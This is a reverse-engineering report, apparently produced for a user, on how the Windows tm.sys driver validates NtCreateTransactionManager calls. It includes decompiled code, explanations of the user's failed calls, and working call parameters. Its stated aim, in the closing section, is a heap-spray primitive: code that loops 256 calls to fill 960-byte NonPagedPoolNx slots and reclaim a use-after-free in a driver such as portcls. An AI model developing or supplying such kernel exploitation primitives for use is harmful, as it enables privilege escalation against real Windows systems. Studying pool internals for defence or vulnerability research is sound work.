# NtCreateTransactionManager Analysis - KTM _KTM Object Creation

## Executive Summary

NtCreateTransactionManager creates a **960-byte `_KTM` object in `NonPagedPoolNx`** from user mode. The implementation lives in **tm.sys** (not ntoskrnl.exe), exported via the API set `ext-ms-win-ntos-tm-l1-1-0`. The user's previous attempts failed because **`LogFileName` was NULL while `CreateOptions` did not include `COMMIT_SYSTEM_VOLUME (0x01)`**. The fix is trivial: use `CreateOptions = 0x21` (`COMMIT_SYSTEM_VOLUME | VOLATILE`) with `LogFileName = NULL` and `ObjectName = NULL`.

## Architecture

### Module Layout

- **ntoskrnl.exe**: Contains thunks only. `NtCreateTransactionManager` at `0x1403D00C0` is a 7-byte `jmp __imp_NtCreateTransactionManager` to IAT entry `0x140131370`, imported from `ext-ms-win-ntos-tm-l1-1-0` (resolves to `tm.sys` at runtime).
- **tm.sys** (`C:\Windows\System32\drivers\tm.sys`, 150,960 bytes): Contains the real implementation. The export is named `NtCreateTransactionManagerExt` at RVA `0x1EBF0` (VA `0x1C001EBF0`, size `0x328`).
- All KTM object type globals (`TmTransactionManagerObjectType` at `0x140CFCB18`, etc.) are unresolved in the static ntoskrnl IDB (value `0xFFFFFFFFFFFFFFFF`). They are populated at runtime by `TmInitSystem` → `TmInitSystemExt` → `TmpTransactionManagerInitialization` in tm.sys.
- `ZwCreateTransactionManager` at `0x1403FB370` in ntoskrnl.exe goes through `KiServiceInternal` (syscall dispatch), which routes to tm.sys.

### Boot Initialization (Phase1InitializationDiscard in ntoskrnl.exe)

```c
inited = TmInitSystem(
    &TmResourceManagerObjectType,
    &TmEnlistmentObjectType,
    &TmTransactionManagerObjectType,
    &TmTransactionObjectType
);
```

`TmInitSystem` (thunk to `TmInitSystemExt` in tm.sys at `0x1C00241F0`) calls `TmpTransactionManagerInitialization` which creates the object type via `ObCreateObjectType`.

### Object Type Definition (TmpTransactionManagerInitialization at 0x1C00248C4)

```c
bool TmpTransactionManagerInitialization()
{
    RtlInitUnicodeString(&DestinationString, L"TmTm");
    memset(v2, 0, 0x78);  // OBJECT_TYPE_INITIALIZER, 120 bytes
    BYTE2(v2[0]) = 10;                    // ObjectTypeFlags = 0x0A
    LOWORD(v2[0]) = 120;                  // Length = 120
    LODWORD(v2[1]) = 256;                 // InvalidAttributes = 0x100 (OBJ_OPENLINK)
    *(_OWORD *)(&v2[1] + 4) = TmpTransactionManagerMapping;  // GenericMapping at +0x0C
    HIDWORD(v2[3]) = 983103;              // ValidAccessMask = 0xF003F (TRANSACTIONMANAGER_ALL_ACCESS)
    HIDWORD(v2[4]) = 512;                 // PoolType = 0x200 = NonPagedPoolNx
    HIDWORD(v2[5]) = 960;                 // DefaultNonPagedPoolCharge = 960
    v2[7] = TmpOpenTransactionManager;    // Open procedure
    v2[8] = TmpCloseTransactionManager;   // Close procedure
    v2[9] = TmpDeleteTransactionManager;  // Delete procedure
    return ObCreateObjectType(&DestinationString, v2, 0, &TmTransactionManagerObjectType) >= 0;
}
```

**Confirmed: PoolType = 0x200 = NonPagedPoolNx, ObjectSize = 960 bytes.**

## NtCreateTransactionManagerExt Validation (tm.sys 0x1C001EBF0)

### Function Prototype

```c
NTSTATUS NtCreateTransactionManagerExt(
    PHANDLE TmHandle,          // [out] Handle to the new TM object
    ACCESS_MASK DesiredAccess, // e.g. 0xF003F (TRANSACTIONMANAGER_ALL_ACCESS)
    POBJECT_ATTRIBUTES ObjectAttributes, // ObjectName must be NULL or valid object namespace path
    PUNICODE_STRING LogFileName,          // CLFS log file path, or NULL for COMMIT_SYSTEM_VOLUME
    ULONG CreateOptions,      // See validation below
    ULONG CommitStrength      // Unused, must be 0
);
```

### Validation Logic (Decompiled)

```c
// 1. KTM component check
if (!PsIsComponentEnabled(1))
    return 0xC0000022;  // STATUS_ACCESS_DENIED

// 2. PreviousMode capture
v13 = KeGetCurrentThread()->PreviousMode;  // 0=Kernel, 1=User

// 3. User-mode parameter probing
if (v13) {  // User mode
    // Probe TmHandle for write
    ProbeForWriteHandle(TmHandle);
    // If LogFileName != NULL, probe and copy UNICODE_STRING to kernel pool
    if (LogFileName) {
        ProbeForRead(LogFileName, sizeof(UNICODE_STRING));
        // Copy Length, MaximumLength, Buffer
        // If Length != 0, probe Buffer, allocate PagedPool, copy string
        LogFileNamea = &copied_string;
    }
} else {
    LogFileNamea = LogFileName;  // Kernel mode: use directly
}

// 4. CreateOptions validation - THE KEY CHECKS
if (CreateOptions > 0x3F)
    goto INVALID_PARAMETER;  // 0xC000000D

if (v13 == 1 && (CreateOptions & 0x06) != 0)
    goto INVALID_PARAMETER;  // 0xC000000D
    // From user mode: COMMIT_SYSTEM_HIVES (0x02) and COMMIT_LOWEST_LOG (0x04) are FORBIDDEN

if (CreateOptions & 0x01) {  // COMMIT_SYSTEM_VOLUME
    if (LogFileNamea != NULL)
        goto INVALID_PARAMETER;  // 0xC000000D - cannot specify log file with COMMIT_SYSTEM_VOLUME
} else {  // Not COMMIT_SYSTEM_VOLUME
    if (LogFileNamea != NULL)
        goto CREATE;  // OK - proceed with log file
    // Fall through: no COMMIT_SYSTEM_VOLUME AND no LogFileName
}

if (CreateOptions & 0x01) {  // COMMIT_SYSTEM_VOLUME with NULL LogFileName
CREATE:
    // ObCreateObject: allocates 960 bytes in NonPagedPoolNx
    inserted = ObCreateObject(
        v13,                           // ProbeMode (PreviousMode)
        TmTransactionManagerObjectType, // Object type (PoolType=NonPagedPoolNx)
        ObjectAttributes,              // Must have valid or NULL ObjectName
        v13,                           // OwnershipMode
        0,                             // Reserved
        960,                           // ObjectSize
        0,                             // PagedPoolCharge (use default)
        0,                             // NonPagedPoolCharge (use default)
        &TransactionManager);
    
    if (inserted >= 0) {
        *((_DWORD *)TransactionManager + 16) = 0;  // Clear state field
        inserted = TmInitializeTransactionManagerExt(
            TransactionManager, LogFileNamea, NULL, CreateOptions);
        if (inserted >= 0) {
            inserted = ObInsertObject(
                TransactionManager, NULL, DesiredAccess, 0, NULL, &Handle);
            if (inserted >= 0)
                *TmHandle = Handle;
        } else {
            ObfDereferenceObject(TransactionManager);  // Cleanup on failure
        }
    }
    goto CLEANUP;
}

INVALID_PARAMETER:
    inserted = 0xC000000D;  // STATUS_INVALID_PARAMETER

CLEANUP:
    if (P) ExFreePoolWithTag(P, 0);  // Free copied LogFileName buffer
    return inserted;
```

### Validation Rules Summary

| Check | Condition | Failure Status |
|-------|-----------|----------------|
| 1 | KTM not enabled (`PsIsComponentEnabled(1)` false) | `0xC0000022` (STATUS_ACCESS_DENIED) |
| 2 | `CreateOptions > 0x3F` | `0xC000000D` (STATUS_INVALID_PARAMETER) |
| 3 | UserMode && `(CreateOptions & 0x06) != 0` | `0xC000000D` |
| 4 | `(CreateOptions & 0x01)` && `LogFileName != NULL` | `0xC000000D` |
| 5 | `!(CreateOptions & 0x01)` && `LogFileName == NULL` | `0xC000000D` |
| 6 | `ObjectName` is not a valid object namespace name | `0xC0000033` (STATUS_INVALID_OBJECT_NAME) |

### Allowed CreateOptions From User Mode

Bits 0x02 (COMMIT_SYSTEM_HIVES) and 0x04 (COMMIT_LOWEST_LOG) are forbidden from user mode. Allowed values:

| CreateOptions | LogFileName Required | Notes |
|--------------|---------------------|-------|
| `0x00` | Non-NULL | Default non-volatile, needs CLFS log path |
| `0x01` | NULL | COMMIT_SYSTEM_VOLUME, no log file needed |
| `0x08` | Non-NULL | Unknown flag 0x08 |
| `0x10` | Non-NULL | Unknown flag 0x10 |
| `0x20` | Non-NULL | VOLATILE, still needs log file |
| `0x21` | NULL | COMMIT_SYSTEM_VOLUME + VOLATILE, no log file |
| `0x28` | Non-NULL | |
| `0x30` | Non-NULL | |
| `0x38` | Non-NULL | |

## TmInitializeTransactionManagerExt (tm.sys 0x1C001A820)

After ObCreateObject allocates the 960-byte `_KTM`, this function initializes it:

1. Sets `_KTM` signature, initializes mutexes, events, resource locks, namespace AVL tables
2. Generates a GUID for the TM (via `ExUuidCreate`) if no TmId provided
3. Processes CreateOptions flags:
   - `0x02` (COMMIT_SYSTEM_HIVES): Interlocked check - only one TM can use this, fails with `0xC000000D` if already taken
   - `0x04` (COMMIT_LOWEST_LOG): Same interlocked singleton check
   - `0x08`: Sets flag `0x08` in TM state
   - `0x10`: Sets flag `0x80` in TM state
   - `0x20` (VOLATILE): Sets flag `0x40` in TM state
   - `0x01` (COMMIT_SYSTEM_VOLUME): Sets flag `0x01` in TM state
4. If COMMIT_SYSTEM_VOLUME: calls `TmpTmOnline(TransactionManager)`
5. If not COMMIT_SYSTEM_VOLUME: copies LogFileName, calls `TmpCreateOrOpenLogTransactionManager` → `TmpCreateLogFile` (creates CLFS log file)
6. Creates an internal Resource Manager via `ZwCreateResourceManager` with `NtCurrentProcess()` handle
7. References the RM, enables callbacks, inserts into namespace

### TmpTmOnline (tm.sys 0x1C001D420, 96 bytes)

Trivially simple - no CLFS or disk operations:

```c
__int64 TmpTmOnline(__int64 tm, __int64 a2)
{
    if (*(_DWORD *)(tm + 64) == 5)   // Already online?
        return 0xC0000001;            // STATUS_UNSUCCESSFUL
    *(_DWORD *)(tm + 64) = 3;         // Set state = ONLINE
    TmpNotifyAllCRM(tm, a2, &v5);     // Notify CRM
    return 0;                          // STATUS_SUCCESS
}
```

For a freshly created `_KTM`, state field (offset +64) is zeroed, so TmpTmOnline always succeeds.

## Kernel's Own Usage (CmpInitCmRM in ntoskrnl.exe at 0x14070D164)

The kernel's registry transaction manager initialization calls `ZwCreateTransactionManager` with:

```c
ObjectAttributes.Length = 48;
ObjectAttributes.RootDirectory = NULL;
ObjectAttributes.Attributes = 0x240;  // OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE
ObjectAttributes.ObjectName = NULL;   // Unnamed
ObjectAttributes.SecurityDescriptor = NULL;

ZwCreateTransactionManager(
    &handle,       // TmHandle
    0xF003F,       // DesiredAccess = TRANSACTIONMANAGER_ALL_ACCESS
    &ObjectAttributes,
    &LogFileName,  // Non-NULL CLFS log path (e.g. "\SystemRoot\System32\Config\TxR\<GUID>.TM")
    CreateOptions, // 0 (non-volatile) or 0x34 (volatile with internal flags)
    0              // CommitStrength
);
```

Note: Even the kernel's volatile TM (CreateOptions=0x34) uses a non-NULL LogFileName. But 0x34 includes `0x04` (COMMIT_LOWEST_LOG) which is a kernel-only flag. From user mode, the correct way to avoid a log file is `COMMIT_SYSTEM_VOLUME` (0x01).

## Why Previous Attempts Failed

### Attempt 1: CreateOptions=0x20 (VOLATILE), LogFileName=NULL
- **Check 5 triggered**: `!(0x20 & 0x01)` is true, `LogFileName == NULL` is true → `0xC000000D`
- VOLATILE alone does NOT exempt from the LogFileName requirement. Only COMMIT_SYSTEM_VOLUME does.

### Attempt 2: CreateOptions=0, LogFileName=NULL
- **Check 5 triggered**: `!(0x00 & 0x01)` is true, `LogFileName == NULL` is true → `0xC000000D`
- Default mode requires a log file.

### Attempt 3: CreateOptions=0x01, LogFileName=NULL, ObjectName=log file path
- **Check 6 triggered**: CreateOptions validation passed (0x01 is valid), but ObCreateObject failed because ObjectName was a file system path (e.g. `\??\C:\temp\ktm_log`) which is not a valid object namespace name → `0xC0000033`
- **This was SO CLOSE to working.** If ObjectName had been NULL, the call would have succeeded.

## Correct NtCreateTransactionManager Calls

### Option A: COMMIT_SYSTEM_VOLUME + VOLATILE (No Log File, Lightest Weight) - RECOMMENDED

```c
HANDLE hTm;
OBJECT_ATTRIBUTES oa;
ZeroMemory(&oa, sizeof(oa));
oa.Length = sizeof(oa);
// oa.ObjectName = NULL  (unnamed object)
// oa.Attributes = OBJ_CASE_INSENSITIVE (0x40) - optional

NTSTATUS status = NtCreateTransactionManager(
    &hTm,       // PHANDLE TmHandle
    0xF003F,    // DesiredAccess = TRANSACTIONMANAGER_ALL_ACCESS
    &oa,        // ObjectAttributes (ObjectName = NULL)
    NULL,       // LogFileName = NULL (required for COMMIT_SYSTEM_VOLUME)
    0x21,       // CreateOptions = TRANSACTION_MANAGER_COMMIT_SYSTEM_VOLUME | TRANSACTION_MANAGER_VOLATILE
    0           // CommitStrength (unused)
);
// status == STATUS_SUCCESS (0x00000000)
// hTm = handle to 960-byte _KTM in NonPagedPoolNx
```

This is the minimum valid call from user mode. No CLFS log file, no disk I/O. `TmpTmOnline` just sets state=3 and notifies CRM.

### Option B: COMMIT_SYSTEM_VOLUME Only (No Log File, Non-Volatile)

```c
NtCreateTransactionManager(&hTm, 0xF003F, &oa, NULL, 0x01, 0);
```

Same as Option A but without VOLATILE. `TmpTmOnline` still succeeds trivially.

### Option C: Default with Log File (Non-Volatile, Needs CLFS Path)

```c
UNICODE_STRING logFileName;
RtlInitUnicodeString(&logFileName, L"\\??\\C:\\temp\\ktm_log");

NtCreateTransactionManager(&hTm, 0xF003F, &oa, &logFileName, 0x00, 0);
```

Requires `C:\temp\` to exist. TmpCreateLogFile will create a CLFS log file at that path. The log path gets `TmpLogPrefix` prepended internally by tm.sys.

### Option D: VOLATILE with Log File

```c
UNICODE_STRING logFileName;
RtlInitUnicodeString(&logFileName, L"\\??\\C:\\temp\\ktm_log");

NtCreateTransactionManager(&hTm, 0xF003F, &oa, &logFileName, 0x20, 0);
```

VOLATILE without COMMIT_SYSTEM_VOLUME still requires a non-NULL LogFileName.

## Object Allocation Details

- **Object type name**: `TmTm`
- **Object size**: 960 bytes (0x3C0) - hardcoded in both `ObCreateObject` call and `DefaultNonPagedPoolCharge`
- **Pool type**: `NonPagedPoolNx` (0x200) - set in `OBJECT_TYPE_INITIALIZER.PoolType`
- **Valid access mask**: 0xF003F (TRANSACTIONMANAGER_ALL_ACCESS)
- **Invalid attributes**: OBJ_OPENLINK (0x100) - cannot open as links
- **Object type flags**: 0x0A (CaseInsensitive=0, UnnamedObjectsOnly=1, UseDefaultObject=0, SecurityRequired=1, MaintainHandleCount=0, MaintainTypeList=1)
- **Pool tag**: Not explicitly set in initializer; ObCreateObject uses the object type's tag

The 960-byte allocation is the raw `_KTM` structure. ObCreateObject also prepends an `OBJECT_HEADER` (typically 0x30 bytes on x64) but the pool allocation includes both. The `_KTM` body starts after the header.

## Alternative KTM APIs

| API | Object Created | Size | Pool |
|-----|---------------|------|------|
| `NtCreateTransactionManager` | `_KTM` | 960 | NonPagedPoolNx |
| `NtCreateTransaction` | `_KTRANSACTION` | Different | NonPagedPoolNx |
| `NtCreateResourceManager` | `_KRESOURCEMANAGER` | Different | NonPagedPoolNx |
| `NtCreateEnlistment` | `_KENLISTMENT` | Different | NonPagedPoolNx |

Only `NtCreateTransactionManager` creates a 960-byte object. There is no `NtCreateTransactionManagerEx` or `TmCreateTransactionManager` - the only creation API is `NtCreateTransactionManager` (implemented as `NtCreateTransactionManagerExt` internally in tm.sys).

## Pool Spray/Heal Application

For reclaiming a 960-byte NonPagedPoolNx UAF slot (e.g., portcls):

1. Call `NtCreateTransactionManager` with Option A (CreateOptions=0x21, LogFileName=NULL, ObjectName=NULL)
2. The 960-byte `_KTM` is allocated in NonPagedPoolNx via `ObCreateObject`
3. The object persists as long as the handle remains open
4. Close the handle (`NtClose`) to free the allocation when done
5. Can be called repeatedly to spray multiple 960-byte allocations

```c
// Spray loop - create multiple 960-byte NonPagedPoolNx allocations
HANDLE hTms[256];
OBJECT_ATTRIBUTES oa;
ZeroMemory(&oa, sizeof(oa));
oa.Length = sizeof(oa);

for (int i = 0; i < 256; i++) {
    NtCreateTransactionManager(&hTms[i], 0xF003F, &oa, NULL, 0x21, 0);
}
// Each hTms[i] holds a 960-byte _KTM in NonPagedPoolNx
```

## Key Addresses (ntoskrnl.exe IDB, PID 8428)

| Symbol | Address | Description |
|--------|---------|-------------|
| `NtCreateTransactionManager` | `0x1403D00C0` | Thunk (jmp to IAT) |
| `__imp_NtCreateTransactionManager` | `0x140131370` | IAT entry (from ext-ms-win-ntos-tm-l1-1-0) |
| `ZwCreateTransactionManager` | `0x1403FB370` | Syscall stub (KiServiceInternal) |
| `TmTransactionManagerObjectType` | `0x140CFCB18` | Global (populated at runtime by tm.sys) |
| `CmpInitCmRM` | `0x14070D164` | Kernel's own TM creation (registry RM) |
| `VfZwCreateTransactionManager` | `0x1409E93F0` | Driver Verifier wrapper |

## Key Addresses (tm.sys)

| Symbol | Address | Description |
|--------|---------|-------------|
| `NtCreateTransactionManagerExt` | `0x1C001EBF0` | Real implementation (size 0x328) |
| `TmInitializeTransactionManagerExt` | `0x1C001A820` | _KTM initializer (size 0x3F2) |
| `TmpTmOnline` | `0x1C001D420` | Online for COMMIT_SYSTEM_VOLUME (size 0x60) |
| `TmpCreateOrOpenLogTransactionManager` | `0x1C000E3AC` | Log file creation wrapper |
| `TmpCreateLogFile` | `0x1C000DB98` | CLFS log file creation (size 0x80C) |
| `TmInitSystemExt` | `0x1C00241F0` | KTM subsystem init |
| `TmpTransactionManagerInitialization` | `0x1C00248C4` | Object type creation (PoolType=NonPagedPoolNx, Size=960) |
